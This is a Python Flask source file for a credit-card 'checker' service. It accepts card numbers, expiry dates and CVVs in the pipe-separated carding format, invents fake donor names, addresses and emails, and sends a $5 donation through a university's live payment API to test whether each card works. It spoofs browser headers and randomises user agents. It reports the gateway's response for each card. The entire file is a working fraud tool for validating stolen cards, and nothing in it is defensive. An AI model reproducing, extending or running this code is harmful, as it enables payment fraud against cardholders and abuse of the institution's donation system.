# wallawalla_api.py
from flask import Flask, request, jsonify
import requests, re, time, random, json, base64
from user_agent import generate_user_agent

app = Flask(__name__)

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip_code = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip_code, phone

@app.route('/wallawalla', methods=['GET'])
def wallawalla_check():
    cc_param = request.args.get('cc')
    
    if not cc_param:
        return jsonify({
            "error": "Missing cc parameter",
            "usage": "/wallawalla?cc=card_number|mm|yy|cvv"
        }), 400
    
    parts = cc_param.split('|')
    if len(parts) < 4:
        return jsonify({
            "error": "Invalid format. Expected: card_number|mm|yy|cvv"
        }), 400
    
    card_number = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    cvv = parts[3].strip()
    
    # Format expiry year
    if len(yy) == 2:
        exp_year = yy
    else:
        exp_year = yy[-2:]
    
    try:
        email, name, add, city, zip_code, phone = gdata()
        r = requests.Session()
        u = generate_user_agent()
        
        headers = {
            'authority': 'payment.wallawalla.edu',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://payment.wallawalla.edu',
            'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': u,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        json_data = {
            'items': [
                {
                    'designation_setid': 'SHARE',
                    'designation': 'SMSUMMER',
                    'data': name,
                    'amount': '5',
                    'anonymous': False,
                },
            ],
            'item_type': 'donation',
            'add_plan': False,
            'is_recurring': False,
            'metadata': {
                'paper_receipt_requested': False,
                'comments': 'Welson',
            },
            'payment_method': 'cc',
            'first_name': name,
            'last_name': name,
            'phone': phone,
            'email': email,
            'street1': add,
            'city': city,
            'state': 'NY',
            'postal': zip_code,
            'country': 'US',
            'card_number': card_number,
            'expiration_month': mm,
            'expiration_year': exp_year,
            'cv_number': cvv,
            'save_information': False,
            'account_nickname': '',
        }
        
        response = r.post(
            'https://payment.wallawalla.edu/api/v1/validate/transaction',
            cookies=r.cookies,
            headers=headers,
            json=json_data,
        )
        data = response.json()
        tras = data['transaction']
        
        headers = {
            'authority': 'payment.wallawalla.edu',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://payment.wallawalla.edu',
            'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': u,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        json_data = {
            'transaction': tras,
            'ach_authorization': False,
        }
        
        response = r.post('https://payment.wallawalla.edu/api/v1/pay', cookies=r.cookies, headers=headers, json=json_data)
        
        # Return the message from response
        result = response.json()
        return jsonify({
            "Card": card_number,
            "message": result.get('message', 'No message')
        })
        
    except Exception as e:
        return jsonify({
            "Card": card_number,
            "error": str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5005, debug=False)
